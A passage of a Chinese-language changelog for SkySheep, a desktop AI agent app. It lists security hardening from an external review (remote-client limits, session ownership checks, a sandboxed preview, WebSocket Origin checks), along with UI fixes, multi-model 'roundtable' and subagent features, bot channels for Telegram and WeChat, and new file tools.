  `core/effort.py` 估算模块；圆桌成员与主席融合同样适用。

### 安全

按外部安全审查汇总（36 项：高危 11、中–高/中 15、低–中 9）完成三层修复，
全部附回归测试（`tests/test_security_hardening.py`，22 项）。

- **远程客户端与本机 UI 的能力边界拉开（根因一）**：dispatch 层新增
  `LOCAL_ONLY_METHODS` 集中收口——凡改配置、写凭据、启动本机程序、导出
  含密数据、切换全局安全姿态的 RPC（模型服务与 MCP 配置、钩子、定时任务、
  设置导入导出、技能、子代理定义、项目切换/删除/项目记忆、局域网/远程开关、
  全局记忆、高级设置等 40 个方法）只允许本机界面调用；持有局域网/Tailscale
  令牌的手机端可继续聊天、批准确认、看任务与用量，保存类操作会得到
  「只能在桌面端本机执行」的明确提示。`lan/remote.status` 对远程客户端只回
  `has_token`，不再回传令牌本体（令牌即远程访问凭据）；跨项目搜索
  （`session.search scope=all`）、项目列表的根目录绝对路径与备份列表的
  本机路径同样只留给本机。
- **会话/资源归属校验（根因二）**：Store 层新增 `get_session_for_project`，
  `chat.send`（含 & 引用的上下文注入）、`session.export/activate/resume/
  fork/delete/truncate/move/改名/置顶/归档/标签`、Cron 改删触发、白名单删除、
  用量统计全部带项目归属条件——凭枚举到的 id 操作别的项目的会话/任务/规则
  一律按「不存在」拒绝；检查点（cp id 顺序可枚举）恢复与 diff 前校验
  会话归属（恢复是写盘原语、diff 会返回文件内容）。子代理任务簿（list/get/
  cancel）与直播事件（`subagent_event`/`task_finished`）带会话归属，远程
  客户端只看到自己正在交互的会话（本机任务簿保持全局视图不变）。
- **同源预览链切断（根因四 D5）**：浏览器面板的 iframe 加 `sandbox`
  （不含 `allow-same-origin`），`/preview` 响应自带 CSP sandbox 与
  `X-Content-Type-Options: nosniff`——预览的工作区 HTML/SVG 运行在独立
  不透明源里，脚本可跑但碰不到本应用的 Cookie/DOM/存储；WS 握手增加
  Origin 校验（与 Host 不一致一律 4403 拒绝），外部网页与沙箱 iframe 从
  本机回环发起的 WS 调用被切断，不再能借管理接口形成 RCE 链。
- **工具分级复核（D4）**：`clipboard_read` 从只读降为需确认——剪贴板常驻
  密码管理器刚复制的凭据，与 `clipboard_write` 同一确认姿态。
- **定时任务按自身项目执行**：扫描循环会看到所有项目的到点任务，此前
  B 项目的任务会挂到当前活动项目的目录与白名单下跑（会话归属、工作目录
  全部错位）；现在按任务所属项目的根目录与白名单执行。
- **评估结论（维持现状，留档）**：`restrict_to_workdir` 默认值维持关
  （单机产品的「任意文件活」能力，设置·高级可一键收紧，开启后只读工具也
  锁进工作目录）；MCP `readonly` 声明维持自动放行（用户本机自己写的配置，
  远程改配置的链路已被门禁切断）；`memory_write`/`schedule_write` 维持
  只读分级（只写应用自有存储，路径固定不接受参数）。

### 修复

- **切换项目时闪现「透明空窗口」（标题为 SkySheep.lnk）+ conhost 进程泄漏**：每次切换项目，
  前端都会关闭并重建底部终端的标签——即使终端面板从未打开过——后端随之为每个新标签
  创建一个 ConPTY 伪控制台；其宿主进程（conhost）在创建瞬间可能可见一帧（窗口标题继承
  自启动快捷方式，于是显示成「D:\…\SkySheep.lnk」的无内容空框），且旧 shell 的宿主
  因泵任务持有 PtyProcess 引用不释放而泄漏，每切一次留一个。现在终端面板收起时切换
  不再预创建终端（展开面板时自动补建），终端槽位关闭后泵任务与 kill 都会释放旧进程
  引用，宿主进程随之退出。
- **其他窗口 / 手机端现在能看到发送方的消息**：轮次事件（回复流）此前只发给
  发起请求的那个连接，同一会话在第二个窗口或手机遥控端打开时，回复会凭空
  出现而看不见说话的人发了什么。后端现在在轮次开始时把 `user_message`
  （文本 + 图片）广播给其余在线客户端（按连接排除发送方，不会重复渲染；
  重新生成轮没有新用户消息、不广播）；前端在对应会话标签里渲染该气泡。
  另：切换项目进行中在输入框发送会被拦截并提示「请等切换完成再发送」，
  避免消息落进已被整体重建的旧界面状态。

- **切换项目不再闪烁**：此前每次切换，侧栏项目列表整体置灰又复原、顶栏状态文字
  「已连接 ↔ 正在切换项目…」来回跳、输入栏的上下文环先隐藏再出现、右侧面板
  （文件树/任务等）先清空再等网络回填，几处一起构成了肉眼可见的「闪一下」。
  现在「切换中」指示延迟 250ms 才亮出（本地切换几十毫秒完成，全程无任何抖动；
  真的慢时才出现提示），上下文环延迟 300ms 隐藏（清零后马上会填回真实值，
  不再立藏立显），右侧面板改为旧内容留屏、新数据到手一次性替换（压暗提示
    延迟 200ms，真的慢才出现；文件树此前在发起加载前就把自己换成「加载中…」
    占位，是文件页签开着时右侧闪烁的主因，一并改为留屏换新；可编辑的项目
    记忆文本框仍即时清空，避免旧项目内容被误存进新项目），
  聊天流 / 侧栏 / 文件树的滚动条槽位常驻预留（`scrollbar-gutter: stable`），
  消息 ↔ 欢迎页高度骤变时内容不再被滚动条左右顶跳。另外切换完成后的新内容
  （聊天流、会话与项目列表）整体淡入 180ms——欢迎卡、「已切换到项目」提示条
  这类大块带边框内容不再瞬间弹入/弹出，消除「像弹窗闪现」的观感。

- **添加服务「检测可用模型」的勾选列表恢复正常排版**：勾选框和模型名本是同一行
  （`.ap-row` 横向 flex），但弹窗表单的 `.form-grid label` 列向布局优先级更高，把它
  压成了「勾选框一行、模型名一行且居中」的错乱样式。现在按 `.inline-check` 同款方式
  显式转回横排；顺带把弹窗表单里勾选/单选框从文本框样式（大方框 + 内边距）中排除、
  恢复原生控件并取主题交互色（`.toolcfg-row` 已有同款处理），列表可视高度 150→240px，
  85 个模型不用滚十几屏。

- **圆桌轮的 token 不再漏记，每日预算护栏对圆桌生效**。圆桌不走 `agent.run_turn`，
  此前一轮圆桌在 `usage_log` 里记的是 0——设置 · 用量页看不到成员消耗，每日 token
  预算护栏也管不住圆桌。现在成员按各自服务/模型逐条入账、主席融合记在主席名下，
  统计页与预算护栏都能看到圆桌的真实成本。

- **圆桌轮点「停止」不再丢提问**。此前用户消息在成员作答全部完成后才入历史，
  作答中途停止会导致问题整条消失；现在与普通轮一致，提问先入历史再开成员作答，
  融合中途停止时已流出的部分回答也照样落库，刷新后还在。

- **重新生成圆桌消息时保留圆桌流程**。此前对圆桌回答点「重新生成」会退化成
  单模型重跑；现在按原配置重跑同样的圆桌（成员、融合/对比、辩论轮数都沿用），
  且不会重复追加用户消息。顺带修掉一个旧问题：重新生成后旧回答会留在界面里、
  刷新前新旧两条重复显示。

- **圆桌融合失败不再全盘丢弃**。成员草稿都成功、只有主席融合失败时，此前用户
  只拿到一个错误、草稿全部消失；现在降级为对比式逐条保留草稿（标注「融合失败 ·
  保留草稿」），已花的 token 不白费。

- **A/B 对比模式不再白跑一次主席融合**。对比模式此前融合照跑、结果被丢弃——
  白耗一次主席调用且向前端发送无用的流式内容；现在对比模式只跑成员作答。

- **圆桌与长会话的上下文护栏对齐**。超长会话开圆桌时成员与主席都拿全量历史 +
  全部草稿，最容易爆的反而是主席；现在与普通轮一样先做上下文压缩，且单成员草稿
  进入融合/辩论提示词前有字符上限截断，防止 8 个成员的长草稿把提示词撑爆。

### 新增

- **会话列表：只留标题 + 相对时间 + 归档**。侧栏会话条目去掉内容预览行
  （此前显示最近一轮回答的开头，两行条目既挤又泄露无关内容）。平时最右侧显示
  「对话结束距现在」的相对时间（刚刚 / N 分钟前 / N 小时前 / N 天前，悬浮看
  完整时刻）；鼠标靠近时时间让位，原位出现「🗄 归档」与「⋯」按钮——归档
  一键直达。归档后会话从侧栏列表、
  搜索结果与启动「接着上次继续」里消失（记录保留不删）；侧栏底部出现
  「🗄 归档会话（N）」入口，弹窗里可恢复或二次确认后彻底删除。会话「⋯」菜单
  重排为：引用此会话（挂进输入框引用托盘，随下一条消息注入上下文）/ 置顶会话 /
  迁移到其他项目 / 重命名 / 删除会话（红色危险项），全部换成线条风 SVG 图标；
  标签与导出入口暂从菜单移除。sessions 表补 archived 列，旧库自动迁移。

- **子代理六项强化：直播、记账、真取消、并发护栏、完成通知、详情弹窗**。
  此前子代理运行是个黑盒：聊天流里只有一张转圈的工具卡片，后台任务只能靠
  任务簿 3 秒轮询；且子代理烧的 token 完全没入 usage_log（用量页与每日预算
  护栏都管不住它，与圆桌漏记同源），「全部取消」只改状态字段、任务照跑照烧钱。
  现在——
  - **过程直播**：子代理的工具调用（grep / read / …）与报告文本流实时渲染进
    spawn_agent 工具卡片内（卡片自动展开）；permission_request 不转发（子代理内
    已预拒绝，弹确认框只会误导）；
  - **token 记账**：任务结束后把已耗 token 记入派生会话名下的 usage_log，
    任务簿条目与详情弹窗显示消耗；被取消时已耗部分也入账；
  - **真取消**：「全部取消」真正 cancel 后台 asyncio 任务并如实标「已取消」；
    任务尚未被调度就被取消的场景由 done 回调兜底落终态；
  - **并发护栏**：后台子代理最多同时 3 个，超限时 spawn_agent 得到友好报错；
  - **完成通知**：后台任务终态广播 task_finished 事件，前端弹通知并刷新任务簿；
  - **详情弹窗**：点任务簿条目弹窗看完整任务描述与结果报告（列表仍截断），
    新增 WS 方法 tasks.get。

- **子代理更愿意自动派发**。主系统提示词此前完全没提子代理，模型只靠工具描述
  自行判断，遇到耗时调研时常自己 inline 搜，工具结果把主上下文灌满。现在提示词
  新增第 14 条指引：大范围只读调研（摸代码结构、跨多文件搜索、多文档对比、大改动
  前收集背景）主动派 spawn_agent 完成，把主上下文留给规划与改码；耗时调研用
  background=true 转 check_task 轮询、边跑边干别的；自定义子代理名称与描述匹配
  任务时优先于内置 explore / task 选用。

- **圆桌·多轮辩论（成员互看修订）**：成员先独立作答，再读到彼此草稿后修订，
  最后由主席融合——对事实类问题能减少单模型的盲区。设置可选 0/1/2 轮（默认关）；
  成员卡按轮显示「第 N 轮修订」，上一轮修订后草稿没变化的成员自动跳过（标「已收敛」）
  不再花钱；输入框圆桌弹层里可逐轮调整「辩论修订」与「主席也出一份草稿」，
  设置 · 技能与工具页新增「圆桌」卡片（成员上限 / 单成员超时 / 辩论轮数 / 主席出草稿）。

- **圆桌草稿持久化回看**：成员草稿随融合消息的元数据落库，刷新或重进会话后
  圆桌卡仍在（默认折叠），展开即可回看各成员最终草稿；成员卡显示本次消耗的
  token 估算，融合徽标悬浮可看各成员用量与辩论轮数。

- **成员草稿「引用追问」**：圆桌成员卡上新增按钮，一键把该成员草稿以引用块
  填进输入框，接着追问「这份方案展开讲讲」「按这个思路再写一版」等，草稿超长
  自动截断，不用手动复制。

- **圆桌小提示补全**：面板勾选的成员超过上限时明确提示「只用了前 N 个」（上限
  可在设置调整）；圆桌轮附带的图片附件会提示「纯文本协作、不会发给成员」（图片
  仍随消息保留），不再静默丢弃。

- **标题栏 / 窗口底色 / 启动页与主题色统一**。桌面壳此前只按「浅 / 深」两档取近似色
  （浅色一律纸墨底、深色一律 `#1D1A16`），青瓷 / 秋柿 / 黛夜 / 松烟等主题下与页面底色
  对不上；「跟随系统」深色时启动动画还是纸色、标题栏已变深，首屏几秒很割裂。现在六套
  主题各自的 `--bg / --text / --ink-line` 逐主题映射到标题栏、窗口底色与边线（标题栏与
  页面底色同源，改主题色时两处一起改），启动页 / 失败页按解析后的主题给深浅两套配色
  （深色用白色线稿 logo）；主题解析提前到窗口创建前，启动首帧起窗口底色、标题栏、
  启动页三者一致；前端回传主题时带主题 id（旧字段 `resolved` 兜底，`light / dark`
  分别映射纸墨 / 夜墨）。

- **桌面壳：窗口最大化时标题栏不再闪回系统黑**。pywebview 会按系统深色模式设置
  沉浸式深色标题栏标志，DWM 在窗口以最大化创建/还原等重绘时机也会把自定标题栏
  颜色画回系统默认色（深色系统下就是黑）。现在自管标题栏颜色时显式关闭沉浸式
  深色标志，看板线程每秒重设一次标题栏颜色兜底（同值重设无视觉变化），且看板
  线程提前到启动期运行，底色与标题栏图标的首刷不再依赖引擎加载完成。

- **顶栏帮助按钮的问号图标不再歪**。原先用的是全角字符「？」，字符字形在字体
  字身框里天生不在正中，缩放/字体渲染下会看出偏移；现换成与顶栏其他图标同规格
  的 SVG 问号（feather 风格，几何精确居中），并已实测按钮内偏差 ≤ 0.5px。

### 新增

- **桌面窗口记住上次的窗口大小与位置**：彻底退出时把窗口几何（含最大化状态）存到
  `~/.skysheep/window_state.json`，下次启动原样恢复——最大化关的就按最大化开，
  还原后回到的是上次的正常大小而非默认尺寸。记录损坏或显示器配置变化（窗口位置
  落在现存屏幕之外）时自动回退默认居中逻辑；缩到系统托盘再退出同样会保存。

- **设置里凡选「服务商」的地方，改为「自动 / 自定义 / 已配置」三档**（联网搜索 / AI 画图 /
  语音输入）。重髁内置服务商下拉：只留自动（优先复用已配置 Key）与自定义（自填地址与 Key）
  两档；第三档「已配置」不是下拉选项，而是一屏列出你在「模型服务」里已经配好的服务
  （名称 + 接口地址 + Key 掩码），点一下即用它作该能力的服务商，地址与 Key 自动复用；
  没配过服务时该档置灰并提示先去配模型服务。内置的智谱 / 硅基流动 / 博查 / Tavily
  等不再单列——它们本就在「自动」的复用顺序里，重复列出反而让人以为必须选它们。

- **语音输入：输入框新增麦克风按钮，说话直接转成文字**。点一下开始录音（按钮红色脉动
  + 计时），再点一下结束并转写，识别文本自动填进输入框（可编辑后再发送）；转写服务在
  设置 · 技能与工具 ·「语音输入」里配置，与联网搜索/画图同一套服务商模式：自动（复用
  已配置 Key 的智谱 / 硅基流动 / OpenAI）或自定义 OpenAI 兼容的 /audio/transcriptions
  地址（支持本地 faster-whisper 服务，无需 Key）。音频经浏览器 MediaRecorder 录制为
  opus/webm 后上传，桌面壳自动放行 WebView2 的麦克风权限（语音输入专属，其它权限
  不受影响）；未配置转写服务时按钮会给出配置指引，不静默失败。上限 120 秒/次。

- **设置 · 新增「远程控制」页**：把原先藏在「界面与通知」里的三项远程接入能力
  「📱 手机控制」「🌐 远程访问（Tailscale）」「🤖 聊天机器人渠道」提出来独立成页，
  导航位于「MCP 服务」之后；「界面与通知」页不再混着与界面无关的卡片。
  功能与安全策略不变（默认关闭、令牌校验、允许名单），只是换了位置、归类更清楚。

- **设置 · 技能与工具页新增「电脑控制 / 浏览器控制」总开关**：这两项原在「高级 ·
  安全与后台」，本质是「Agent 能用哪些工具」而不是「远程接入」，现在放到「技能与工具 ·
  内置工具」列表上方，与工具清单同一页（开关后列表即时更新），并从「改完再点保存」
  改为**开关即生效**（保存只提交这一项，其余高级参数不动）；默认关闭、
  高危逐次确认、可加动作白名单等策略不变。「高级」页保留工作目录限制 / 工作区信任 /
  开机自启。代码注释与文档里的引用位置同步更新。

- **微信渠道：扫码登录即可在微信里遥控 Agent**。与 Telegram 不同，微信不需要填 Token——
  点「生成登录二维码」后用手机微信扫码确认，凭据落到本机，之后在微信里给机器人发消息即可
  与这台电脑上的 SkySheep 对话。实现走腾讯官方的 iLink Bot API（`ilinkai.weixin.qq.com`，
  即「微信 ClawBot」能力；请求头、长轮询形状与发消息结构均按腾讯官方 npm 包
  `@tencent-weixin/openclaw-weixin` 源码核对，未引入新依赖）。两处协议特性决定了实现方式：
  回复必须原样带回入站消息的 `context_token`（否则消息落不到正确窗口），收消息用
  `get_updates_buf` 游标而非 offset（游标每次落盘，重启不重放旧消息）；token 失效
  （服务端 `-14`）时进入一小时冷却并在界面提示需要重新登录。启用条件与 Telegram 一致：
  允许名单为空即拒绝一切，未开启审批时只能读不能写。扫码登录与退出登录属敏感操作，
  只能在桌面端本机完成。

- **聊天机器人渠道（Bot Channel）：把 Telegram 接成遥控端**。此前「手机控制」要求手机
  与电脑在同一 Wi-Fi（或都装 Tailscale），现在设置 · 界面与通知新增「🤖 聊天机器人渠道」卡片：
  填一个 BotFather 给的 Token，把你的 chat id 加入允许名单，就能在 Telegram 里直接和这台
  电脑上的 SkySheep 对话——回复回到聊天窗口，Agent 干活时该会话在桌面会话列表可见。
  支持 `/status`（看会话与模型）、`/new`（开新会话）、`/sessions`、`/stop`、`/help` 命令，
  其余文本原样交给 Agent。

  安全姿态与电脑控制 / 浏览器控制同类：**默认关闭**；**允许名单为空即拒绝一切**（不是放行一切，
  因为知道机器人用户名的人都能给它发消息）；名单外的消息只记录不回复，避免向陌生人确认机器人
  的存在。**未开启「允许机器人改文件 / 跑命令」时，渠道会话走无人值守门控——只读自动放行，
  写与执行一律自动拒绝**，Agent 收到「已拒绝」后继续而不是卡住。开启该选项后，敏感操作会把
  确认卡片推到聊天窗口，回复 `allow` / `allow always` / `deny` 即可；**超时（默认 120 秒，可调）
  自动拒绝**——不设超时会让 Agent 永久等待一个不会到来的回复。渠道会话与桌面会话相互独立、
  可并行使用，且渠道无法触发开局域网、切权限模式等降低防护的操作（远端来源连渠道配置本身
  都改不了）。新增 `channels/` 包（`base` / `commands` / `gate` / `manager` / `telegram`）、
  `channel.*` WS 方法与 `channel_bindings` / `channel_sources` 两张表；Telegram 用原生 HTTP
  长轮询实现，未引入新的第三方依赖。

- **终端升级为多标签真 PowerShell（ConPTY）**：底部终端面板的每个标签是一个常驻的真实
  PowerShell 会话（Windows ConPTY 伪终端，pywinpty）——提示符、ANSI 颜色、↑↓ 历史、
  Ctrl+C、交互程序（python / git commit 等）都按真实控制台工作，cd 与环境变量跨命令保留；
  前端用 xterm.js（vendor 内置，配色随六套主题）渲染，键盘直通。标签序号取「最小未占用」：
  关掉中间的标签后，新建的补上空号，不再一直涨。后端 `TerminalManager` 按标签管理 PTY
  （上限 8 个），泵任务持续读输出并广播 `term_data` / `term_exit`（`term_id` 路由）；
  WS 方法 `term.spawn` / `term.input` / `term.resize`（仅本机）与 `term.stop`（Ctrl+C，
  远端可发）/ `term.close`。顶栏通知中心右侧新增终端开关按钮（快捷键 Ctrl+`），收起面板时
  会话继续在后台跑；「→ Agent」把最近 40 行输出带入主输入框，标签条内一键清屏。

- **对话输入支持「& 引用对话」**：在输入框敲 `&` 会弹出当前项目的会话清单（继续输入可按标题
  过滤，↑↓ 选择、Enter 确认、Esc 关闭），选中的对话以 🔗 小片挂在输入框上方、可随时移除；
  消息发出后被引用对话的完整记录注入本轮上下文——每轮最多 3 个对话、每个最多保留最近 4000 字
  （超长标省略、保尾留新），格式与 /export 一致并随用户消息持久化，Agent 就能接着旧话题继续聊。
  引用清单排除当前会话自己，不存在的会话静默跳过；工作中发消息的排队轮同样携带引用。
  `chat.send` 新增 `refs` 参数；输入框占位提示补全 & / @ / 斜杠命令 / 粘贴拖图等入口，切换规划 / 执行模式不再丢提示。

- **技能「扫描本机」：自动识别电脑里已有的技能，勾选即导入**：别家 agent 工具（Claude Code /
  通用 agents / Codex）的技能都装在 home 下的固定目录，SkySheep 此前只能手动选文件夹导入。
  现在设置 · 技能页新增「扫描本机」按钮：只读探测 `~/.claude/skills`、`~/.agents/skills`、
  `~/.codex/skills` 与本项目 `.claude/skills`（限深 3 层，GitHub 仓库常见的
  repo-main/skills/xxx 套法也能找到），弹窗列出候选（名称 / 描述 / 来源徽章），与已装技能
  同名的灰显排除，勾选后走既有导入流程复制安装（全局 / 仅本项目自选），装完立即生效。
  扫描本身不动任何文件，与技能发现共用同一套 SKILL.md 宽容解析（没有 name 字段时用目录名
  兜底）；新增只读 WS 方法 `skills.scan_local`，安装仍走既有 `skills.install`。

- **非 UTF-8 文本文件不再被读成乱码、写回时不再损坏**：新增 `textio` 模块统一探测
  编码（BOM → UTF-8 → GB18030，并做 round-trip 校验）与主行尾符。此前
  `read_file` / `write_file` / `edit_file` 一律按 `utf-8, errors="replace"` 读写，
  中文 Windows 上普遍存在的 GBK 文件会被读成一串 `U+FFFD` 替换字符，而一旦编辑
  （模型以为文件本来就是这样）就把替换字符固化写回，原文永久丢失。现在编码能识别
  时按原编码写回、行尾符 LF/CRLF 原样保持；编码探不出来（既非 UTF-8 也非 GB18030）
  时**拒绝编辑**并说明原因，而不是带着替换字符覆盖。右侧文件面板同步受益：
  `fs.read` 返回编码与行尾符、编辑器标题标注（如「GBK · CRLF」），`fs.write` 按原
  编码与行尾符落盘——此前 textarea 会把 CRLF 归一成 LF，保存一次整个文件 diff 全是噪声。

- **新增 `read_image` 工具：让 Agent 直接看到本地图片**。此前只有截图能把图像送进
  上下文，用户给一张 `报告截图.png` 时 Agent 只能拿到一堆替换字符。现在支持
  PNG / JPG / WebP / GIF：按文件头校验真实类型（改名改错的文件会被明确指出）、
  超过 1568px 自动等比缩小重编码、模型不支持图片输入时给出换模型的指引。
  同时 `read_file` 遇到二进制内容会明确报错——图片指引改用 `read_image`，PDF/Word/
  Excel/PPT 指引改用 `read_document`，不再吐出一屏乱码。

- **新增文件移动 / 删除 / 建目录工具，并把移动与删除纳入检查点**：
  `move_file`（移动即重命名，目标重名默认拒绝、需显式 `overwrite=true`）、
  `delete_file`（删非空目录需显式 `recursive=true`，`safety=DANGEROUS`）、
  `make_dir`。三类操作都走权限门与工作目录沙箱，并且可被「撤销本轮改动」回滚
  ——此前这两类操作只能走 `run_command` 里的 `mv` / `rm`，既不进权限门的分级策略、
  也不进检查点，误操作无法回退。确认弹窗会列出将被处置的实际路径（目录则完整列出
  内容与总大小），而不是只给一个模糊的目录名。官方种子技能 `file-tidy` 同步改用
  `move_file`，整理文件夹从此可回滚。

- **远程 MCP 服务器支持自定义请求头（带鉴权的托管服务）**：`mcp.json` 的服务定义
  新增 `headers` 字段，设置页「手动添加 MCP 服务」可直接填写（每行一个 `名称: 值`）。
  此前连接远程 MCP 时不带任何请求头，Notion / Linear / GitHub 官方 Remote MCP 这类
  需要 `Authorization` 的服务无法接入。stdio 服务不受影响（该字段对本地命令无意义）。

- **PPT（.pptx）读写**：`read_document` 支持 `.pptx`，按页抽取正文（含项目符号层级
  与表格，并按行展开为 `|` 分隔）以及**演讲者备注**（要点常写在备注里，只读正文会漏掉
  一半信息）；`write_document` 支持生成 `.pptx`，用 Markdown 子集描述——`#` 作封面、
  `##` 开新页、`-` 列表变项目符号（两空格缩进降级）、`> 引用`写作演讲者备注；
  内容过多时自动缩小正文字号并在返回摘要里建议拆页。此前引擎只支持 PDF / Word / Excel，
  而技能广场已上架 PPT 相关技能，属于基础能力缺口。

- **设置 · 高级新增「钩子（Hooks）」面板**：把此前只能手改 `config.toml` 的
  `[hooks]` 搬到界面里——前/后钩子分组列出，可直接添加、编辑工具名通配、命令与超时，
  保存即热生效（重建 HookRunner 并推给所有活动会话，无需重启）。工具名输入框带
  已注册工具的候选列表；前端会先拦下未填命令的条目并指出是第几行；后端校验命令非空、
  不含换行（命令经 `cmd /c` 执行，换行等于塞进第二条命令）、超时在 1–600 秒之间，
  非法值直接报错而不是静默取默认值。两组都清空时整张 `[hooks]` 表会被移除。

- **会话标签与分组**：侧栏会话列表可按标签分组——在会话菜单（⋯ 或右键）选「🏷 标签…」
  填写，多个标签用逗号分隔（中英文逗号都认）；有标签的会话归入对应分组（可属多组），
  无标签的归入「未分组」；点分组头即可只看该组、再点一次取消。标签编辑弹窗会列出当前
  项目已用过的标签供点击复用。全部会话都没标签时不显示分组头，列表与从前完全一致。
  归一化在存储层：去空白、去重、保序，最多 12 个、每个不超过 24 字。

### 变更

- **终端从右侧面板移到底部独立面板，并从「单命令执行器」换成真终端**：右侧面板不再有
  「终端」标签（旧偏好里保存的 terminal 标签自动过滤，无感迁移），右面板无标签时点开关
  默认展开「辅助对话」。安全边界不变：终端只在本机可用（`local` 校验，开标签 / 输入 /
  调整尺寸远端拒绝，Ctrl+C 与关闭标签除外），shell 在项目工作目录启动，不进权限门
  （命令由用户亲自敲，由本人负责）。

- **侧栏「MCP / Skills」改为在右侧面板打开，不再跳转设置页**：技能与 MCP 服务是聊天时
  高频要看的东西，此前点侧栏入口会整页切去设置、看完再手动返回。现在与任务清单 / 日程
  一样作为右侧面板标签打开（MCP 服务在上、技能在下，整页滚动）；设置页的技能 / MCP 卡片
  只有一份，靠 DOM 搬家在「设置页 ↔ 右面板」之间共享（事件绑定按 ID 不受位置影响），
  进设置前自动搬回，面板与设置的标签持久化、内置预设一键添加、导入 / 扫描等操作在
  两处都能用。

- **「界面 −/+」缩放控件从侧栏移进设置页**：侧栏底部常驻的缩放步进占着一行，多数用户调完一次
  就不再碰。现在挪进设置 · 界面与通知的「界面缩放」卡片，与说明文字同处一卡，侧栏底部只留
  「⚙ 设置」入口；步长（10%）、范围（70%–120%）与偏好保存逻辑不变（控件元素与 ID 原样搬移，
  `applyUiScale` / `changeUiScale` 无改动）。

- **跨会话搜索改用 FTS5 全文索引**：`messages` 增加 `messages_fts` 虚表（trigram
  分词），中文子串、英文大小写不敏感都能命中，不再对每一条消息做 `LIKE` 全表扫描。
  选择 trigram 的原因是 FTS5 默认的 unicode61 会把整段中文当成一个 token——搜「测试」
  命不中「中文测试内容」。索引与消息同写同删（新增、截断、删会话、删项目、分叉复制
  都同步），旧库在启动时自动回填一次；FTS 不可用（未编 FTS5 / 虚表缺失 / 查询语法异常）
  或查询短于 3 字符时自动退到原来的 LIKE 路径，行为不变。

- **截图副本改为保留最近 60 张**：`~/.skysheep/screenshots` 此前只增不减，
  用久了会持续占用磁盘；现在按修改时间淘汰最旧的（与检查点的保留策略同一模式），
  且只处理 `.png`，不波及用户自己放进该目录的其它文件。

- **`write_file` / `edit_file` 的编码行为变更**：写回不再强制 UTF-8 + 系统默认行尾，
  而是沿用被覆盖文件原本的编码与行尾符；新建文件仍是 UTF-8 + LF。

### 修复

- **手机 / 窄窗口访问不再被右侧面板「卡住」**：手机打开时，桌面端「右侧面板展开」的状态
  被原样恢复——面板以覆盖抽屉形式盖住大半屏幕，而唯一的开关（顶栏按钮）在窄屏被隐藏、
  标签上的关闭 ✕ 又只在鼠标悬停时出现（触屏没有 hover），结果既关不掉也收不回。现在
  窄屏（≤860px，与侧栏抽屉同一断点）启动一律收起面板，且手机上的开合**不回写**偏好
  （桌面端「上次开着面板」不受手机操作影响）；顶栏开关恢复显示，✕ 常显，点一下对话区
  也能收回抽屉；抽屉与侧栏的宽度写法从 `min()` 改为等价的 `width + max-width`——部分
  老内核（安卓 X5）不支持 `min()`，整条声明失效时会退回桌面宽度把屏幕占满。

- **手机上「打开右面板 → 再点设置」不再卡死**：进设置后侧栏抽屉还盖在屏幕上，而“点一下收回”的监听挂在对话区、设置页里点不到；且设置模式会隐藏整个对话视图，对话区顶栏的 ☰ 一起消失——手机上再也无法唤出侧栏，设置子页导航与「← 返回对话」全在侧栏里，进去就出不来。现在进/出设置、点侧栏导航、切设置子页都会先收回侧栏抽屉；设置页顶栏左上角新增同款 ☰（仅窄屏显示），手机上随时能唤出侧栏导航。
- **两个抽屉不再互相锁死**：先开右侧面板再开 ☰ 侧栏，两个抽屉能把屏幕盖满、互相挡住
  对方的收回入口（此前正是这样被困住的）。现在开其中一个会自动收起另一个；并加了「抽屉背衬」——抽屉打开时其余区域压暗，点一下暗处就收回所有抽屉回到对话；侧栏右上角
  也补了 ✕ 关闭钮。至此手机上每个抽屉状态都至少有两个独立出口。

- **`CHANGELOG.md` 中「设置 · 新增『远程控制』页」条目有一行重复**，已删除。

## [1.1] - 2026-09-18

### 新增

- **右侧文件面板支持直接编辑文档**：点文件树里的文本文件不再只是只读预览——直接变成
  编辑器，改完 Ctrl+S（或点「保存」）写回磁盘；「＋ 新建」可建带子目录的新文件
  （如 `docs/笔记.md`），创建后立即打开并自动出现在文件树里。保存做**冲突检测**：如果
  文件在你打开之后被 Agent 或其他程序改过，后端拒绝落盘并弹「覆盖保存 / 取消」确认，
  不会无意盖掉别人的改动；编辑器打开期间文件被删则保存时自动恢复。PDF/Word/Excel 仍是
  提取文本的只读预览（改了存不回去，标题行注明），HTML/图片仍走浏览器面板预览。实现上
  新增 WS `fs.write`（与 fs.read 共用工作目录沙箱：拒绝路径穿越、绝对路径、Windows
  非法字符与保留设备名、2MB 上限；用户主动保存不走 PermissionGate，与设置页写配置同级），
  fs.read 补 `mtime`（毫秒精度，避免 JS Number 精度丢失导致冲突误报）与 `editable` 标记。
  顺带三处联动：Agent 写入/编辑文件、检查点撤销回滚后，文件树自动刷新（文件标签开着
  立即重拉，没开则下次打开时拉新）；小文件体积以字节显示（此前 0.0KB）。

- **主题从两套扩到六套：新增「青瓷」「秋柿」两套浅色与「黛夜」「松烟」两套深色**。设置 ·
  界面的主题选择从三档分段按钮换成配色卡片（每张卡片带纸面 / 交互色 / 文字色小样），
  「跟随系统」保留：浅色默认落纸墨、深色默认落夜墨；选中具体主题则不再随系统切换。
  四套新主题沿用同一组「纸面 × 墨线 × 压印投影」变量槽位，只是换配色——青瓷是龙泉青釉
  （淡青灰瓷底 + 釉青交互），秋柿是柿染暖橙（烤米纸底 + 熟柿橙交互），黛夜是靛蓝夜空
  （冷靛夜底 + 提亮鸢尾蓝，亮色交互上压深字），松烟是松烟墨绿（墨绿夜底 + 提亮翠色）；
  每套主题都带配套的代码高亮色板，终端、Mermaid、DWM 标题栏深浅随主题明暗自动适配。
  实现上把交互色上的文字色抽成 `--on-accent` 变量（此前四处硬编码纸色），交互色变量
  沿用 `--blue` 名字但语义是「主题主色」。ui.json 的 `theme` 键从 `auto|light|dark`
  扩为 `auto|主题 id`，旧值 `light` / `dark` 读取时分别按纸墨 / 夜墨处理，无感升级。

- **远程访问（Tailscale）：手机不在同一 Wi-Fi 也能连回家里的 SkySheep**。此前「手机控制」
  只覆盖同一局域网；现在设置 · 手机控制多了「🌐 远程访问（Tailscale）」开关：电脑与手机
  都安装 Tailscale（tailscale.com）并登录同一账号，开启并重启 SkySheep 后，手机在任意网络
  （含手机流量）扫码即可用完整界面继续聊 / 批准确认 / 看任务进度。实现上与局域网访问共用
  同一把令牌与强度校验（remote.enable 也接受自定义令牌）；开启后服务同样绑定全部网卡，
  但仅此模式下 HTTP 与 WebSocket 会先按来源分类：只有本机（免令牌，桌面自己不被挡在门外）
  与 Tailscale 网段（IPv4 CGNAT 100.64.0.0/10 及其 IPv6 ULA fd7a:115c:a1e0::/48，必须验
  令牌）能进来，物理局域网里的其它设备反而被直接拒绝；「自动允许写入」等降防护开关依旧
